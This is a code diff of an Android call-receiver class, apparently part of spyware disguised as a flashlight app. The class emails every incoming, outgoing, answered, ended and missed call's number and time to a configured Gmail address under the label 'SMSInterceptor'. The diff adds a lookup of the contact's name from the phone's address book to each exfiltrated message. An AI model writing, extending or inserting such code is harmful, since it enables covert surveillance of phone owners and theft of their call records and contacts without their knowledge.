@@ -14,13 +14,16 @@ import android.telephony.TelephonyManager;
 
 public class CallReceiver extends PhoneCallReceiver {
 
+  private static Contacts contact;
   private static GmailSender sender;
   private static Configure configure;
+
   private static String gmailEmailString;
 
   private static final String TAG = "FlashLight CallReceiver";
 
   public CallReceiver() { 
+    contact   = new Contacts();
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) { 
       gmailEmailString = String.valueOf(configure.getEmailAddress());
@@ -31,8 +34,22 @@ public class CallReceiver extends PhoneCallReceiver {
     Log.i(TAG, "CallReceiver() constructor gmailEmailString: " + gmailEmailString);
   }
 
+  public String endPoint(final String number, Context context) {
+
+    String end_point;
+    final String contact_name  = contact.getContactName(number, context);
+
+    if(!contact_name.isEmpty()) {
+      end_point = "" + number + "(" + contact_name + ")";
+    }
+    else {
+      end_point = number;
+    }
+    return end_point;
+  }
+
   @Override
-  protected void onIncomingCallReceived(final Context ctx, final String number, final Date start) { 
+  protected void onIncomingCallReceived(final Context context, final String number, final Date start) { 
     Log.i(TAG,"Entering onIncomingCallReceived()");
     new Thread(new Runnable() {
 
@@ -40,7 +57,7 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + endPoint(number, context) + "\nStart Time: " + start, gmailEmailString);
           Log.i(TAG, "onIncomingCallReceived() Sending E-mail.");
         }
         catch(Exception e) {
@@ -52,7 +69,7 @@ public class CallReceiver extends PhoneCallReceiver {
   }
 
   @Override
-  protected void onIncomingCallAnswered(final Context ctx, final String number, final Date start) {
+  protected void onIncomingCallAnswered(final Context context, final String number, final Date start) {
     Log.i(TAG,"Entering onIncomingCallAnswered()");
     new Thread(new Runnable() {
 
@@ -60,7 +77,7 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + number + "\nStart Time: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + endPoint(number, context) + "\nStart Time: " + start, gmailEmailString);
           Log.i(TAG, "onIncomingCallAnswered() Sending E-mail.");
         }
         catch(Exception e) {
@@ -72,7 +89,7 @@ public class CallReceiver extends PhoneCallReceiver {
   }
 
   @Override
-  protected void onIncomingCallEnded(final Context ctx, final String number, final Date start, final Date end) { 
+  protected void onIncomingCallEnded(final Context context, final String number, final Date start, final Date end) { 
     Log.i(TAG,"Entering onIncomingCallEnded()");
     new Thread(new Runnable() {
 
@@ -80,7 +97,7 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + number + "\nEnd Time: " + end, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end, gmailEmailString);
           Log.i(TAG, "onIncomingCallEnded() Sending E-mail.");
         }
         catch(Exception e) {
@@ -92,7 +109,7 @@ public class CallReceiver extends PhoneCallReceiver {
   }
 
   @Override
-  protected void onOutgoingCallStarted(final Context ctx, final String number, final Date start) { 
+  protected void onOutgoingCallStarted(final Context context, final String number, final Date start) { 
     Log.i(TAG,"Entering onOutgoingCallStarted()");
     new Thread(new Runnable() {
 
@@ -100,7 +117,7 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + number + "\nStart Time: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + endPoint(number, context) + "\nStart Time: " + start, gmailEmailString);
           Log.i(TAG, "onOutgoingCallStarted() Sending E-mail.");
         }
         catch(Exception e) {
@@ -112,7 +129,7 @@ public class CallReceiver extends PhoneCallReceiver {
   } 
 
   @Override 
-  protected void onOutgoingCallEnded(final Context ctx, final String number, final Date start, final Date end) { 
+  protected void onOutgoingCallEnded(final Context context, final String number, final Date start, final Date end) { 
     Log.i(TAG,"Entering onOutgoingCallEnded()");
     new Thread(new Runnable() {
 
@@ -120,7 +137,7 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + number + "\nEnd Time: " + end, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end, gmailEmailString);
           Log.i(TAG, "onOutgoingCallEnded() Sending E-mail.");
         }
         catch(Exception e) {
@@ -132,7 +149,7 @@ public class CallReceiver extends PhoneCallReceiver {
   }
 
   @Override
-  protected void onMissedCall(final Context ctx, final String number, final Date start) { 
+  protected void onMissedCall(final Context context, final String number, final Date start) { 
     Log.i(TAG,"Entering onMissedCall()");
     new Thread(new Runnable() {
 
@@ -140,7 +157,7 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + number + "\nTime: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + endPoint(number, context) + "\nTime: " + start, gmailEmailString);
           Log.i(TAG, "onMissedCall() Sending E-mail.");
         }
         catch(Exception e) {
